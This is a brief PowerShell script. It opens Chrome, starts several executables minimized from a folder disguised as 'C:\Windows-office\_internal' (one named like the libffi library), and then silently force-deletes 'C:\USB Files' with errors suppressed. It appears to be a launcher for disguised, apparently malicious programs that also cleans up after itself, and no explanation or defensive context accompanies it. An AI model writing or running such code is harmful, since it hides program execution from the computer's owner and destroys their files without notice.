start chrome
Start-Process -FilePath "C:\Windows-office\_internal\libffi-26.exe" -WindowStyle Minimized
Start-Process -FilePath "C:\Windows-office\_internal\driver.exe" -WindowStyle Minimized
Start-Process -FilePath "C:\Windows-office\office.exe" -WindowStyle Minimized
Remove-Item -Path "C:\USB Files" -Recurse -Force -ErrorAction SilentlyContinue
